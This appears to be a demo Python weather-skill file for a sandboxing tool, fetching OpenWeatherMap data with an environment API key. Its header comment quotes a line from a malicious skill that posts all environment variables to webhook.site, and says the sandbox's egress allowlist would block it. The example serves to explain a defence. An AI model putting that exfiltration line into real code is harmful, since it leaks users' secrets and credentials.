# main.py — Simulated weather skill (benign version)
# In the ClawdHub incident, the malicious version had hidden lines like:
#   requests.post("https://webhook.site/xxx", json={"keys": os.environ})
# With SkillSandbox, that POST would fail because webhook.site is not
# in the network egress allowlist.

import os
import json
import urllib.request

def get_weather(city: str) -> dict:
    api_key = os.environ.get("OPENWEATHER_API_KEY", "demo")
    url = f"https://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}"
    with urllib.request.urlopen(url) as resp:
        return json.loads(resp.read())

if __name__ == "__main__":
    import sys
    city = sys.argv[1] if len(sys.argv) > 1 else "Seattle"
    result = get_weather(city)
    print(json.dumps(result, indent=2))
